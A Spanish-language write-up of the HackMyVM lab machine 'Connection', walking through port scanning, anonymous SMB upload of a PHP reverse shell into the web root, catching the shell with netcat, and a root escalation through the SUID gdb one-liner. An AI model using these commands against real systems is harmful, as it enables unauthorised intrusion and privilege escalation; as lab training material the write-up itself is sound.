---
title:      "Connection"
excerpt:    "Hoy vamos a realizar otra máquina de HackMyVM sencillita para ir poco a poco a otras más complicadas."
toc:        true
toc_label:  "Tabla de contenidos"
toc_icon:   "key"
header:
  teaser: /assets/images/connection/prev.png
  teaser_home_page: true
  icon: /assets/images/HMV.png
classes:    wide
categories:
  - HackMyVM
tags:  
  - Easy
  - Linux
  - SMB
  - Reverse shell
  - SUID
---

![](/assets/images/connection/prev.png){: .align-center}

Hoy vamos a realizar otra máquina de HackMyVM sencillita para ir poco a poco a otras más complicadas.


## Reconocimiento de Puertos

En primer lugar averiguamos la IP de la máquina víctima:

~~~bash
❯ sudo arp-scan -l | grep "PCS"
192.168.0.18  08:00:27:d9:da:c0 PCS Systemtechnik GmbH
~~~

Ahora realizamos el reconocimiento de puertos abiertos:

~~~ruby
❯ nmap -p- --open -T5 -v -n 192.168.0.18

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
~~~


## Analizando vectores de ataque

Vamos a ver qué muestra el contenido web por el puerto 80:

![](/assets/images/connection/80.png){: .align-center}

Página por defecto de Apache2 de Debian en este caso, y si miramos el código no hay ninguna pista.

Ahora vamos a listar los recursos que nos figuran por SMB sin que pregunte contraseña:

~~~bash
❯ smbclient -N -L 192.168.0.18
Anonymous login successful

  Sharename       Type      Comment
  ---------       ----      -------
  share           Disk      
  print$          Disk      Printer Drivers
  IPC$            IPC       IPC Service (Private Share for uploading files)
~~~

Vamos a ver qué hay en "share", al cual tenemos acceso:

~~~bash
❯ smbclient -N //192.168.0.18/share
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 23 03:48:39 2020
  ..                                  D        0  Wed Sep 23 03:48:39 2020
  html                                D        0  Thu Nov 24 12:13:41 2022

    7158264 blocks of size 1024. 5341464 blocks available
smb: \> cd html
smb: \html\> ls
  .                                   D        0  Thu Nov 24 12:13:41 2022
  ..                                  D        0  Wed Sep 23 03:48:39 2020
  index.html                          N    10701  Wed Sep 23 03:48:45 2020

    7158264 blocks of size 1024. 5341464 blocks available
~~~

Bien, ahí tenemos el index.html por defecto que vimos por http anteriormente. En este punto, la idea está clara, subir una reverse shell de PHP. Usaremos la de [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). Le configuramos nuestra IP y puerto deseado, y le damos permisos de ejecución con `chmod +x php-reverse-shell.php`. Ahora solo queda subirla:

~~~bash
smb: \html\> put php-reverse-shell.php
putting file php-reverse-shell.php as \html\php-reverse-shell.php (233,3 kb/s) (average 233,3 kb/s)
~~~

Nos ponemos en escucha con `nc -nlvp 1234` y lanzamos la shell desde el navegador `http://192.168.0.18/php-reverse-shell.php`

Estamos dentro, por lo que lanzamos con Python una terminal interactiva y la tratamos para que nos funcione todo correctamente:

~~~bash
❯ nc -nlvp 1234
listening on [any] 1234 ...
connect to [192.168.0.24] from (UNKNOWN) [192.168.0.18] 46310
Linux connection 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
 08:58:00 up  2:17,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@connection:/$ export TERM=xterm
export TERM=xterm
www-data@connection:/$ export SHELL=bash
export SHELL=bash
www-data@connection:/$ 
~~~

Ahora solo nos queda ir a por la flag de user:

~~~bash
www-data@connection:/$ cd /home
cd /home
www-data@connection:/home$ ls
ls
connection
www-data@connection:/home$ cd connection
cd connection
www-data@connection:/home/connection$ ls
ls
local.txt
www-data@connection:/home/connection$ cat local.txt
cat local.txt
~~~


## Escalada de privilegios

En este caso vamos a ver los binarios SUID que tenemos:

~~~bash
$ find / -type f -perm -4000 -ls 2>/dev/null
     3678     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   271481     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   273055    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
   265674     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
   266157     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
   265821     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
   262208     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
   279120   7824 -rwsr-sr-x   1 root     root        8008480 Oct 14  2019 /usr/bin/gdb
   262204     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
   262203     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
   266155     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
   262206     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
~~~   

Podemos observar que tenemos el binario "gdb" del cual nos podemos aprovechar usando la ayuda de <https://gtfobins.github.io/gtfobins/gdb/#suid> para convertirnos en root:

~~~bash
www-data@connection:/$ /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
proof.txt
# cat proof.txt 
cat proof.txt
~~~

Y con esto, habríamos terminado la máquina. Nos vemos en la siguiente.
